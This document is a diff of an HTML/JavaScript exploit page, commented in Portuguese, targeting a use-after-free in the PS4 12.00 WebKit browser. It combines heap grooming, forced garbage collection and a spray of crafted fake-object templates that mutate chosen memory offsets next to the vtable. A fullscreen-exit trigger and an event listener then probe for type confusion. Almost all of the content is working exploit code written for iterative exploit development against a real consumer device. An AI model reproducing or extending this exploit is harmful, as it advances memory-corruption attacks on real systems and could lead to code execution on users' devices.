@@ -1,71 +1,73 @@
-
 <!DOCTYPE html>
 <html>
 <head>
 <meta charset="UTF-8">
-<title>PS4 UAF - Info Leak Event Trapper</title>
+<title>PS4 UAF - Dissecação do Fake Object</title>
 <style>
     body { background-color: #111; color: #0f0; font-family: monospace; font-size: 16px; padding: 20px;}
-    #log { margin-top: 20px; white-space: pre-wrap; }
-    .leak { color: #ff00ff; font-weight: bold; font-size: 20px;}
+    button { padding: 15px; margin: 5px; cursor: pointer; background: #333; color: #0f0; border: 1px solid #0f0; font-weight: bold; }
+    button:hover { background: #555; }
+    #log { margin-top: 20px; white-space: pre-wrap; font-size: 18px; }
+    .leak { color: #ff00ff; font-weight: bold; font-size: 22px;}
+    .info { color: #ffff00; font-weight: bold; }
 </style>
 </head>
 <body>
 
-<h2>PS4 12.00 - Info Leak via Event Trap</h2>
-<button onclick="runTest()" style="padding: 15px; cursor: pointer; background: #333; color: #0f0; border: 1px solid #0f0;">Iniciar Interceptação</button>
-<div id="log">Aguardando...</div>
+<h2>PS4 12.00 - Manipulação de Metadados (NodeFlags)</h2>
+<p>Selecione qual offset de memória vamos corromper para tentar mudar a Tag do Zumbi.</p>
+
+<button onclick="runTest(1)">Teste 1: Mutação no Offset 0x08</button>
+<button onclick="runTest(2)">Teste 2: Mutação no Offset 0x10</button>
+<button onclick="runTest(3)">Teste 3: Mutação no Offset 0x18</button>
+<button onclick="runTest(4)">Teste 4: Mutação no Offset 0x20</button>
+
+<div id="log">Aguardando seleção...</div>
 
 <script>
-// Padrão 0x2222222222222222 (Mais seguro para tentar ler sem causar segfault imediato)
-const PATTERN = 1.1125369292536e-308; 
+let currentMutationOffset = 0;
 
-// Listener global para tentar capturar o objeto "Zumbi" durante a transição
+// O Listener interceptador (O nosso radar de Type Confusion)
 document.addEventListener('webkitfullscreenchange', (event) => {
     let log = document.getElementById("log");
-    log.innerHTML += "<br><span style='color: yellow;'>[*] Evento webkitfullscreenchange INTERCEPTADO!</span>";
+    log.innerHTML += "<br><span class='info'>[*] Evento webkitfullscreenchange INTERCEPTADO!</span>";
     
     try {
-        // O C++ tenta nos dizer quem disparou o evento. É aqui que o leak ocorre!
         let alvoZumbi = event.target;
-        let fsAtual = document.webkitFullscreenElement;
         
-        log.innerHTML += `<br>[*] Tag do alvo do evento: ${alvoZumbi ? alvoZumbi.tagName : 'null'}`;
-        
-        if (alvoZumbi && alvoZumbi.tagName !== 'DIV') {
-            log.innerHTML += `<br><span class="leak">[!!!] LEAK DE TIPO! TagName corrompido: ${alvoZumbi.tagName}</span>`;
-        }
-
         if (alvoZumbi) {
-            // Tenta ler propriedades internas que podem estar lendo o nosso Spray (0x22222222)
-            let larguraLeak = alvoZumbi.clientWidth;
-            log.innerHTML += `<br>[*] clientWidth do alvo: ${larguraLeak}`;
+            let tagVazada = alvoZumbi.tagName;
+            log.innerHTML += `<br>[*] Tag do alvo do evento: ${tagVazada}`;
             
-            if (larguraLeak > 10000) {
-                log.innerHTML += `<br><span class="leak">[!!!] INFO LEAK GEOMÉTRICO CONFIRMADO: ${larguraLeak}</span>`;
+            if (tagVazada === 'HTML') {
+                log.innerHTML += `<br>[-] Sem alteração estrutural. A tag continua HTML.`;
+            } else if (tagVazada !== 'DIV') {
+                log.innerHTML += `<br><span class="leak">[!!!] BINGO! O OFFSET CONTROLA O TIPO! TagName: ${tagVazada}</span>`;
             }
+        } else {
+            log.innerHTML += `<br>[-] alvoZumbi é nulo ou indefinido.`;
         }
     } catch(e) {
-        // Às vezes o motor C++ lança uma exceção com partes da memória vazada na string de erro
-        log.innerHTML += `<br><span class="leak">[!] Exceção capturada no evento: ${e.message}</span>`;
+        log.innerHTML += `<br><span class="leak">[!] Exceção capturada: ${e.message}</span>`;
     }
 });
 
-function runTest() {
+function runTest(testMode) {
     const log = document.getElementById("log");
-    log.innerHTML = "Preparando alocações...<br><b>Pressione OPTIONS agora!</b>";
+    log.innerHTML = "Preparando o Fake Object...<br><b>Pressione OPTIONS agora!</b>";
 
     let controllers = [];
 
-    // [1] Alocação
+    // [1] Alocação Inicial (Heap Grooming)
     for(let i = 0; i < 5000; i++) {
         let arr = new Float64Array(8);
         arr[0] = i;
         controllers.push(arr);
     }
 
+    // [2] Criação do Alvo
     let fsTarget = document.createElement("div");
-    fsTarget.innerHTML = "<h1 style='color: white; margin-top: 20%; text-align: center;'>Trap Ativada<br>Aperte OPTIONS</h1>";
+    fsTarget.innerHTML = `<h1 style='color: white; margin-top: 20%; text-align: center;'>Mutação: Offset 0x${(testMode * 8).toString(16).padStart(2, '0')}<br>Aperte OPTIONS</h1>`;
     fsTarget.style.cssText = "background:black; width:100%; height:100%; position:absolute; top:0; left:0;";
     document.body.appendChild(fsTarget);
 
@@ -74,25 +76,49 @@ function runTest() {
     }
 
     window.onblur = function() {
-        log.innerHTML += "<br>[*] Onblur. Forçando GC e Spray...";
+        log.innerHTML += "<br>[*] Construindo o molde de memória...";
 
-        // [2] GC
+        // [3] GC
         controllers = null;
         for (let i = 0; i < 20000; i++) {
             new ArrayBuffer(0x10000);
         }
 
-        // [3] Spray Envenenado
+        // --- ENGENHARIA DO FAKE OBJECT ---
+        // Usamos um ArrayBuffer para manipular a memória em nível de bits (Uint32)
+        // e depois convertê-la perfeitamente para Float64 no Spray.
+        let buffer = new ArrayBuffer(80); // 80 bytes = 10 blocos de 64-bits
+        let u32 = new Uint32Array(buffer);
+        let f64Template = new Float64Array(buffer);
+
+        // Preenchemos com o padrão "seguro" que nos devolve a tag HTML (0x22222222)
+        for(let i = 0; i < 20; i++) {
+            u32[i] = 0x22222222;
+        }
+
+        // Aplicamos a mutação (0x33333333) no offset escolhido.
+        // O offset 0x00 (u32[0] e u32[1]) é o VTable pointer, não tocamos nele para evitar crash antecipado.
+        if (testMode === 1) { // Offset 0x08
+            u32[2] = 0x33333333; u32[3] = 0x33333333; 
+        } else if (testMode === 2) { // Offset 0x10
+            u32[4] = 0x33333333; u32[5] = 0x33333333;
+        } else if (testMode === 3) { // Offset 0x18
+            u32[6] = 0x33333333; u32[7] = 0x33333333;
+        } else if (testMode === 4) { // Offset 0x20
+            u32[8] = 0x33333333; u32[9] = 0x33333333;
+        }
+
+        // [4] Spray com o Fake Object Estruturado
         let spray = [];
         for(let i = 0; i < 8000; i++) {
             let p = new Float64Array(10);
-            p.fill(PATTERN);
+            p.set(f64Template); // Copia o molde exato
             spray.push(p);
         }
 
-        // [4] Gatilho Cirúrgico
+        // [5] O Gatilho e Interceptação
         setTimeout(() => {
-            log.innerHTML += "<br>[*] Acionando Gatilho (Remove -> Exit -> Reload)...";
+            log.innerHTML += "<br>[*] Acionando Gatilho Síncrono...";
             try {
                 fsTarget.remove(); 
                 
@@ -103,8 +129,8 @@ function runTest() {
                 log.innerHTML += "<br>[Erro] " + e;
             }
 
-            // Aumentei o tempo do reload para 1000ms para dar tempo de lermos os logs do Event Listener antes do crash/reload
-            setTimeout(() => location.reload(), 1000);
+            // Atraso antes do travamento/reload para podermos ler a resposta
+            setTimeout(() => location.reload(), 1500);
         }, 3000);
     };
 }
